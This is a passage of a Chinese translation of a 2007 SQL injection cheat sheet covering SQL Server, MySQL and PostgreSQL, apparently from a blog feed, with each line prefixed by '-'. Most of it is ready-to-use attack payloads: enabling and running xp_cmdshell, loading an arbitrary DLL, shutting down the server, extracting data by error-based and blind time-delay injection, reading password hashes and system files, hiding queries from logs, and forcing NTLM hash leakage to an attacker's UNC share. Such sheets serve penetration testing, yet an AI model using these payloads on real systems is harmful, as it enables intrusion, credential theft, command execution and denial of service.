-<h4 id="toc_40">SQL Server的其它内置程序(S)</h4>
-
-<ol>
-<li><p>命令执行 (xp_cmdshell) </p>
-
-<p><code>exec master..xp_cmdshell &#39;dir&#39;</code></p></li>
-<li><p>注册表操作 (xp_regread)</p>
-
-<ol>
-<li>xp_regaddmultistring</li>
-<li>xp_regdeletekey</li>
-<li>xp_regdeletevalue</li>
-<li>xp_regenumkeys</li>
-<li>xp_regenumvalues</li>
-<li>xp_regread</li>
-<li>xp_regremovemultistring</li>
-<li><p>xp_regwrite </p>
-
-<pre><code>exec xp_regread HKEY_LOCAL_MACHINE, &#39;SYSTEM\CurrentControlSet       \Services\lanmanserver\parameters&#39;, &#39;nullsessionshares&#39; 
-exec xp_regenumvalues HKEY_LOCAL_MACHINE, &#39;SYSTEM       \CurrentControlSet  \Services\snmp\parameters\validcommunities&#39;
-</code></pre></li>
-</ol></li>
-<li><p>管理服务(xp_servicecontrol)</p></li>
-<li><p>媒体(xp_availablemedia)</p></li>
-<li><p>ODBC 资源 (xp_enumdsn)</p></li>
-<li><p>登录 (xp_loginconfig)</p></li>
-<li><p>创建Cab文件 (xp_makecab)</p></li>
-<li><p>域名列举 (xp_ntsec_enumdomains)</p></li>
-<li><p>杀进程 (need PID) (xp_terminate_process)</p></li>
-<li><p>新建进程 (<em>实际上你想干嘛都行</em>) </p>
-
-<pre><code>sp_addextendedproc ‘xp_webserver’, ‘c:\temp\x.dll’ 
-exec xp_webserver
-</code></pre></li>
-<li><p>写文件进UNC或者内部路径 (sp_makewebtask)</p></li>
-</ol>
-
-<h4 id="toc_41">大量MSSQL笔记</h4>
-
-<p><code>SELECT * FROM master..sysprocesses /*WHERE spid=@@SPID*/</code></p>
-
-<p><code>DECLARE @result int; EXEC @result = xp_cmdshell &#39;dir *.exe&#39;;IF (@result = 0) SELECT 0 ELSE SELECT 1/0</code></p>
-
-<p>HOST_NAME() <br/>
-IS_MEMBER (Transact-SQL)<br/><br/>
-IS_SRVROLEMEMBER (Transact-SQL)<br/><br/>
-OPENDATASOURCE (Transact-SQL)</p>
-
-<p><code>INSERT tbl EXEC master..xp_cmdshell OSQL /Q&quot;DBCC SHOWCONTIG&quot;</code></p>
-
-<p>OPENROWSET (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms190312.aspx">http://msdn2.microsoft.com/en-us/library/ms190312.aspx</a></p>
-
-<p>你不能在 SQL Server 的Insert查询里使用子查询(sub select).</p>
-
-<h4 id="toc_42">使用LIMIT(M)或ORDER(MSO)的注入</h4>
-
-<p><code>SELECT id, product FROM test.test t LIMIT 0,0 UNION ALL SELECT 1,&#39;x&#39;/*,10 ;</code></p>
-
-<p>如果注入点在LIMIT的第二个参数处，你可以把它注释掉或者使用union注入。</p>
-
-<h4 id="toc_43">关掉SQL Server(S)</h4>
-
-<p>如果你真的急了眼，<code>&#39;;shutdown --</code></p>
-
-<h3 id="toc_44">在SQL Server 2005中启用xp_cmdshell</h3>
-
-<p>默认情况下，SQL Server 2005中像xp_cmdshell以及其它危险的内置程序都是被禁用的。如果你有admin权限，你就可以启动它们。</p>
-
-<pre><code>EXEC sp_configure &#39;show advanced options&#39;,1 
-RECONFIGURE
-
-EXEC sp_configure &#39;xp_cmdshell&#39;,1 
-RECONFIGURE
-</code></pre>
-
-<h3 id="toc_45">探测SQL Server数据库的结构(S)</h3>
-
-<h4 id="toc_46">获取用户定义表</h4>
-
-<p><code>SELECT name FROM sysobjects WHERE xtype = &#39;U&#39;</code></p>
-
-<h4 id="toc_47">获取字段名</h4>
-
-<p><code>SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;tablenameforcolumnnames&#39;)</code></p>
-
-<h3 id="toc_48">移动记录(Moving records)(S)</h3>
-
-<ul>
-<li><p>修改WHERE，使用<strong>NOT IN</strong>或者<strong>NOT EXIST</strong><br/>
-<code>... WHERE users NOT IN (&#39;First User&#39;, &#39;Second User&#39;)</code><br/>
-<code>SELECT TOP 1 name FROM members WHERE NOT EXIST(SELECT TOP 0 name FROM members)</code> &ndash; 这个好用</p></li>
-<li><p>脏的不行的小技巧</p>
-
-<p><code>SELECT * FROM Product WHERE ID=2 AND 1=CAST((Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE i.id&lt;=o.id) AS x, name from sysobjects o) as p where p.x=3) as int</code></p>
-
-<p><code>Select p.name from (SELECT (SELECT COUNT(i.id) AS rid FROM sysobjects i WHERE xtype=&#39;U&#39; and i.id&lt;=o.id) AS x, name from sysobjects o WHERE o.xtype = &#39;U&#39;) as p where p.x=21</code></p></li>
-</ul>
-
-<h3 id="toc_49">快速的脱掉基于错误(Error Based)的SQL Server注入(S)</h3>
-
-<p><code>&#39;;BEGIN DECLARE @rt varchar(8000) SET @rd=&#39;:&#39; SELECT @rd=@rd+&#39; &#39;+name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = &#39;MEMBERS&#39;) AND name&gt;@rd SELECT @rd AS rd into TMP_SYS_TMP end;--</code></p>
-
-<p><strong>详情请参考：<a href="http://ferruh.mavituna.com/makale/fast-way-to-extract-data-from-error-based-sql-injections/">Fast way to extract data from Error Based SQL Injections</a></strong></p>
-
-<h3 id="toc_50">盲注</h3>
-
-<h4 id="toc_51">关于盲注</h4>
-
-<p>一个经过完整而优秀开发的应用一般来说你是<strong>看不到错误提示的</strong>，所以你是没办法从Union攻击和错误中提取出数据的</p>
-
-<p><strong>一般盲注</strong>，你不能在页面中看到响应，但是你依然能同个HTTP状态码得知查询的结果</p>
-
-<p><strong>完全盲注</strong>，你无论怎么输入都完全看不到任何变化。你只能通过日志或者其它什么的来注入。虽然不怎么常见。</p>
-
-<p>在一般盲注下你能够使用<strong>If语句</strong>或者<strong>WHERE查询注入</strong><em>(一般来说比较简单)</em>，在完全盲注下你需要使用一些延时函数并分析响应时间。为此在SQL Server中你需要使用<strong>WAIT FOR DELAY &lsquo;0:0:10&rsquo;</strong>，在MySQL中使用<strong>BENCHMARK()</strong>，在PostgreSQL中使用<strong>pg_sleep(10)</strong>，以及在ORACLE中的一些<strong>PL/SQL小技巧</strong>。</p>
-
-<h4 id="toc_52">实战中的盲注实例</h4>
-
-<p>以下的输出来自一个真实的私人盲注工具在测试一个SQL Server后端应用并且遍历表名这些请求完成了第一个表的第一个字符。由于是自动化攻击，SQL查询比实际需求稍微复杂一点。其中我们使用了二分搜索来探测字符的ASCII码。</p>
-
-<p><strong>TRUE</strong>和<strong>FALSE</strong>标志代表了查询返回了true或false</p>
-
-<pre><code>TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;78-- 
-
-FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;103-- 
-
-TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
-FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;89-- 
-
-TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
-FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;83-- 
-
-TRUE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0) 
-FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)&gt;80-- 
-
-FALSE : SELECT ID, Username, Email FROM [User]WHERE ID = 1 AND ISNULL(ASCII(SUBSTRING((SELECT TOP 1 name FROM sysObjects WHERE xtYpe=0x55 AND name NOT IN(SELECT TOP 0 name FROM sysObjects WHERE xtYpe=0x55)),1,1)),0)
-</code></pre>
-
-<p>由于上面<strong>后两个查询都是false</strong>，我们能清楚的知道表名的第一个<strong>字符的ASCII码是80，也就是&quot;P&rdquo;</strong>。这就是我们通过二分算法来进行盲注的方法。其他已知的方法是一位一位(bit by bit)地读取数据。这些方法在不同条件下都很有效。</p>
-
-<h3 id="toc_53">延时盲注</h3>
-
-<p>首先，只在完全没有提示(really blind)的情况下使用，否则请使用1/0方式通过错误来判断差异。其次，在使用20秒以上的延时时要小心，因为应用与数据库的连接API可能会判定为超时(timeout)。</p>
-
-<h4 id="toc_54"><code>WAITFOR DELAY [time]</code>(S)</h4>
-
-<p>这就跟<code>sleep</code>差不多，等待特定的时间。通过CPU来让数据库进行等待。</p>
-
-<p><code>WAITFOR DELAY &#39;0:0:10&#39;--</code></p>
-
-<p>你也可以这样用</p>
-
-<p><code>WAITFOR DELAY &#39;0:0:0.51&#39;</code></p>
-
-<h4 id="toc_55">实例</h4>
-
-<ul>
-<li>俺是sa吗？
-<code>if (select user) = &#39;sa&#39; waitfor delay &#39;0:0:10&#39;</code></li>
-<li>ProductID =<code>1;waitfor delay &#39;0:0:10&#39;--</code></li>
-<li>ProductID =<code>1);waitfor delay &#39;0:0:10&#39;--</code></li>
-<li>ProductID =<code>1&#39;;waitfor delay &#39;0:0:10&#39;--</code></li>
-<li>ProductID =<code>1&#39;);waitfor delay &#39;0:0:10&#39;--</code></li>
-<li>ProductID =<code>1));waitfor delay &#39;0:0:10&#39;--</code></li>
-<li>ProductID =<code>1&#39;));waitfor delay &#39;0:0:10&#39;--</code></li>
-</ul>
-
-<h4 id="toc_56"><code>BENCHMARK()</code>(M)</h4>
-
-<p>一般来说都不太喜欢用这个来做MySQL延时。小心点用因为这会极快地消耗服务器资源。<br/>
-<code>BENCHMARK(howmanytimes, do this)</code></p>
-
-<h4 id="toc_57">实例</h4>
-
-<ul>
-<li><p>俺是root吗？爽！<br/>
-<code>IF EXISTS (SELECT * FROM users WHERE username = &#39;root&#39;) BENCHMARK(1000000000,MD5(1))</code></p></li>
-<li><p>判断表是否存在<br/>
-<code>IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))</code></p></li>
-</ul>
-
-<h4 id="toc_58"><code>pg_sleep(seconds)</code>(P)</h4>
-
-<p>睡眠指定秒数。</p>
-
-<ul>
-<li><code>SELECT pg_sleep(10);</code>睡个十秒</li>
-</ul>
-
-<h3 id="toc_59">掩盖痕迹</h3>
-
-<h4 id="toc_60"><code>-sp_password log bypass</code>(S)</h4>
-
-<p>出于安全原因，SQL Server不会把含有这一选项的查询日志记录进日志中(!)。所以如果你在查询中添加了这一选项，你的查询就不会出现在数据库日志中，当然，服务器日志还是会有的，所以如果可以的话你可以尝试使用POST方法。</p>
-
-<h3 id="toc_61">注入测试</h3>
-
-<p>这些测试既简单又清晰，适用于盲注和悄悄地搞。</p>
-
-<ol>
-<li><p><code>product.asp?id=4 (SMO)</code></p>
-
-<ol>
-<li><code>product.asp?id=5-1</code></li>
-<li><code>product.asp?id=4 OR 1=1</code></li>
-</ol></li>
-<li><p><code>product.asp?name=Book</code></p>
-
-<ol>
-<li><code>product.asp?name=Bo’%2b’ok</code></li>
-<li><code>product.asp?name=Bo’ || ’ok (OM)</code></li>
-<li><code>product.asp?name=Book’ OR ‘x’=’x</code></li>
-</ol></li>
-</ol>
-
-<h3 id="toc_62">一些其他的MySQL笔记</h3>
-
-<ul>
-<li>子查询只能在MySQL4.1+使用</li>
-<li>用户
-
-<ul>
-<li><code>SELECT User,Password FROM mysql.user;</code></li>
-</ul></li>
-<li><code>SELECT 1,1 UNION SELECT IF(SUBSTRING(Password,1,1)=&#39;2&#39;,BENCHMARK(100000,SHA1(1)),0) User,Password FROM mysql.user WHERE User = ‘root’;</code></li>
-<li><code>SELECT ... INTO DUMPFILE</code>
-
-<ul>
-<li>把查询写入一个<strong>新文件</strong>中(不能修改已有文件)</li>
-</ul></li>
-<li>UDF功能
-
-<ul>
-<li><code>create function LockWorkStation returns integer soname &#39;user32&#39;;</code></li>
-<li><code>select LockWorkStation();</code></li>
-<li><code>create function ExitProcess returns integer soname &#39;kernel32&#39;;</code></li>
-<li><code>select exitprocess();</code></li>
-</ul></li>
-<li><code>SELECT USER();</code></li>
-<li><code>SELECT password,USER() FROM mysql.user;</code></li>
-<li>admin密码哈希的第一位
-
-<ul>
-<li><code>SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;</code></li>
-</ul></li>
-<li>文件读取
-
-<ul>
-<li><code>query.php?user=1+union+select+load_file(0x63...),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></li>
-</ul></li>
-<li><p>MySQL读取文件内容</p>
-
-<ul>
-<li><p><strong>默认这个功能是没开启的！</strong></p>
-
-<pre><code>create table foo( line blob ); 
-load data infile &#39;c:/boot.ini&#39; into table foo; 
-select * from foo;
-</code></pre></li>
-</ul></li>
-<li><p>MySQL里的各种延时</p></li>
-<li><p><code>select benchmark( 500000, sha1( &#39;test&#39; ) );<br/>
-query.php?user=1+union+select+benchmark(500000,sha1 (0x414141)),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1</code></p></li>
-<li><p><code>select if( user() like &#39;root@%&#39;, benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; );</code></p></li>
-<li><p><strong>遍历数据，暴力猜解</strong></p>
-
-<ul>
-<li><code>select if( (ascii(substring(user(),1,1)) &gt;&gt; 7) &amp; 1,benchmark(100000,sha1(&#39;test&#39;)), &#39;false&#39; );</code></li>
-</ul></li>
-</ul>
-
-<h4 id="toc_63">MySQL中好用的函数</h4>
-
-<ul>
-<li><p><code>MD5()</code></p>
-
-<p>MD5哈希</p></li>
-<li><p><code>SHA1()</code> </p>
-
-<p>SHA1哈希</p></li>
-<li><p><code>PASSWORD()</code></p></li>
-<li><p><code>ENCODE()</code></p></li>
-<li><p><code>COMPRESS()</code> </p>
-
-<p>压缩数据，在盲注时读取大量数据很好用</p></li>
-<li><p><code>ROW_COUNT()</code></p></li>
-<li><p><code>SCHEMA()</code></p></li>
-<li><p><code>VERSION()</code></p>
-
-<p>跟<code>@@version</code>是一样的</p></li>
-</ul>
-
-<h3 id="toc_64">SQL注入的高级使用</h3>
-
-<p>一般来说你在某个地方进行SQL注入并期望它没有过滤非法操作，而这则是一般人注意不到的层面（hidden layer problem）</p>
-
-<blockquote>
-<p>Name:<code>&#39; + (SELECT TOP 1 password FROM users ) + &#39;</code></p>
-
-<p>Email : <code>xx@xx.com</code></p>
-</blockquote>
-
-<p>如果应用在name表格中使用了不安全的储存方法或步骤，之后它就会把第一个用户的密码写进你的name里面。</p>
-
-<h4 id="toc_65">强制SQL Server来得到NTLM哈希</h4>
-
-<p>这个攻击能够帮助你得到目标SQL服务器的Windows密码，不过你的连接很可能会被防火墙拦截。这能作为一个很有用的入侵测试。我们强制SQL服务器连接我们的WindowsUNC共享并通过抓包软件(Cain &amp; Abel)捕捉NTLM session。</p>
-
-<h4 id="toc_66">Bulk insert UNC共享文件 (S)</h4>
-
-<p><code>bulk insert foo from &#39;\\YOURIPADDRESS\C$\x.txt&#39;</code></p>
-
-<h2 id="toc_67">参考资料</h2>
-
-<p>因为以下笔记是这几年从各种不同来源手机的，还有一些是个人经验，所以我可能漏掉了一些参考项。如果你肯定我漏了你的或者其他人的资料请<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件</a><em>(ferruh-at-mavituna.com)</em>，我会尽快更新。</p>
-
-<ul>
-<li><strong>各种资料</strong>
-
-<ul>
-<li><a href="http://www.ngssoftware.com/papers/advanced_sql_injection.pdf">Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
-<li><a href="http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf">More Advanced SQL Injection In SQL Applications</a>, <em>Chris Anley</em></li>
-<li><a href="http://www.imperva.com/download.asp?id=4">Blindfolded SQL Injection, Ofer Maor</a> – <em>Amichai Shulman</em></li>
-<li><a href="http://www.ngssoftware.com/papers/HackproofingMySQL.pdf">Hackproofing MySQL</a>, <em>Chris Anley</em></li>
-<li><a href="http://eu.wiley.com/WileyCDA/WileyTitle/productCd-0764578014.html">Database Hacker&rsquo;s Handbook, David Litchfield</a>, <em>Chris Anley, John Heasman, Bill Grindlay</em></li>
-<li><strong>楼上的团队</strong>！</li>
-</ul></li>
-<li><strong>MSSQL相关</strong>
-
-<ul>
-<li>MSSQL Operators - <a href="http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa276846(SQL.80).aspx</a></li>
-<li>Transact-SQL Reference - <a href="http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx">http://msdn2.microsoft.com/en-us/library/aa299742(SQL.80).aspx</a></li>
-<li>String Functions (Transact-SQL)  - <a href="http://msdn2.microsoft.com/en-us/library/ms181984.aspx">http://msdn2.microsoft.com/en-us/library/ms181984.aspx</a></li>
-<li>List of MSSQL Server Collation Names - <a href="http://msdn2.microsoft.com/en-us/library/ms180175.aspx">http://msdn2.microsoft.com/en-us/library/ms180175.aspx</a></li>
-<li>MSSQL Server 2005 Login Information and some other functions : <a href="http://www.notsosecure.com/">Sumit Siddharth</a></li>
-</ul></li>
-<li><strong>MySQL相关</strong>
-
-<ul>
-<li>Comments : <a href="http://dev.mysql.com/doc/">http://dev.mysql.com/doc/</a></li>
-<li>Control Flows - <a href="http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html">http://dev.mysql.com/doc/refman/5.0/en/control-flow-functions.html</a></li>
-<li>MySQL Gotchas - <a href="http://sql-info.de/mysql/gotchas.htm">http://sql-info.de/mysql/gotchas.htm</a></li>
-<li><a href="http://www.securiteam.com/securityreviews/5KP0N1PC1W.html">New SQL Injection Concept</a>, <em>Tonu Samuel</em></li>
-</ul></li>
-</ul>
-
-<h2 id="toc_68">更新日志</h2>
-
-<ul>
-<li>15/03/2007 - Public Release v1.0</li>
-<li>16/03/2007 - v1.1
-
-<ul>
-<li>Links added for some paper and book references</li>
-<li>Collation sample added</li>
-<li>Some typos fixed</li>
-<li>Styles and Formatting improved</li>
-<li>New MySQL version and comment samples</li>
-<li>PostgreSQL Added to Ascii and legends, pg_sleep() added blind section</li>
-<li>Blind SQL Injection section and improvements, new samples</li>
-<li>Reference paper added for MySQL comments</li>
-</ul></li>
-<li>21/03/2007 - v1.2
-
-<ul>
-<li>BENCHMARK() sample changed to avoid people DoS their MySQL Servers</li>
-<li>More Formatting and Typo</li>
-<li>Descriptions for some MySQL Function</li>
-</ul></li>
-<li>30/03/2007 v1.3
-
-<ul>
-<li>Niko pointed out PotsgreSQL and PHP supports stacked queries</li>
-<li>Bypassing second MD5 check login screens description and attack added</li>
-<li>Mark came with extracting NTLM session idea, added</li>
-<li>Detailed Blind SQL Exploitation added</li>
-</ul></li>
-<li>13/04/2007 v1.4 - Release
-
-<ul>
-<li>SQL Server 2005 enabling xp_cmdshell added (trick learned from mark)</li>
-<li><a href="http://www.byakuya-shobo.co.jp/hj/2007_05_SQLcheat.html">日文版SQL注入速查表发布</a> (<em>v1.1</em>)</li>
-</ul></li>
-</ul>
-
-<h3 id="toc_69">待办事项 / 联系方式 / 帮助</h3>
-
-<p>我有一大堆ORACLE、PostgreSQL、DB2和MS Access的笔记，还有一些其他还没整理的小技巧. 我想应该很快就能整理好了。如果你想加入进来或者提供一些技巧，<a href="http://ferruh.mavituna.com/iletisim/">给我发邮件吧</a><em>(ferruh-at-mavituna.com)</em></p>
 
 ]]></content>
   </entry>
